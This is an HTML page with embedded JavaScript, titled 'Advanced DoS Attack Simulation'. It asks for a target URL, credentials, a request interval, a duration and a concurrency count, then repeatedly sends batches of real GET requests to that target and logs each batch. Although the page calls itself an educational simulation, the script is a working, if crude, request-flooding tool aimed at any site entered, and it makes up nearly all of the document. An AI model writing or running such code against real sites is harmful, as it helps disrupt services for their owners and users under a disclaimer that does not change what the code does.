<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced DoS Attack Simulation</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: url('bg.jpg') no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            padding: 20px;
            text-align: center;
            color: #fff;
        }

        h1 {
            color: #fff;
        }

        label {
            display: block;
            margin: 10px 0;
            color: #fff;
        }

        input {
            padding: 10px;
            width: 300px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        p {
            color: #fff;
            margin-top: 20px;
        }

        #attackPanel {
            margin-top: 20px;
            text-align: left;
            color: #fff;
        }
    </style>
    <script>
        function initiateDoS() {
            var target = document.getElementById("targetWebsite").value;
            var intervalTime = document.getElementById("intervalTime").value;
            var duration = document.getElementById("duration").value;
            var concurrentRequests = document.getElementById("concurrentRequests").value;
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            var attackPanel = document.getElementById("attackPanel");

            attackPanel.innerHTML = `Attack Started at: ${new Date().toLocaleTimeString()}<br>`;
            
            var interval = setInterval(function() {
                for (let i = 0; i < concurrentRequests; i++) {
                    var xhr = new XMLHttpRequest();
                    xhr.open("GET", target, true, username, password);
                    xhr.send();
                }
                
                // Display ongoing attack details in the panel
                attackPanel.innerHTML += `Launching ${concurrentRequests} requests | Target: ${target}<br>`;
            }, intervalTime);

            setTimeout(function() {
                clearInterval(interval);
                attackPanel.innerHTML += `<br>Attack completed at: ${new Date().toLocaleTimeString()}<br>`;
            }, duration);
        }
    </script>
</head>
<body>
    <h1>Advanced DoS Attack Simulation</h1>
    <label for="targetWebsite">Target Website:</label>
    <input type="text" id="targetWebsite" placeholder="Enter target website URL">
    <label for="username">Username:</label>
    <input type="text" id="username" placeholder="Enter username">
    <label for="password">Password:</label>
    <input type="password" id="password" placeholder="Enter password">
    <label for="intervalTime">Interval Time (ms):</label>
    <input type="number" id="intervalTime" placeholder="Enter interval time in milliseconds" value="1000">
    <label for="duration">Attack Duration (ms):</label>
    <input type="number" id="duration" placeholder="Enter attack duration in milliseconds" value="5000">
    <label for="concurrentRequests">Concurrent Requests:</label>
    <input type="number" id="concurrentRequests" placeholder="Enter the number of concurrent requests" value="5">
    <button onclick="initiateDoS()">Start DoS Attack</button>
    <div id="attackPanel"></div>
    <p>This is an educational simulation. Use responsibly and adhere to legal standards.</p>
</body>
</html>
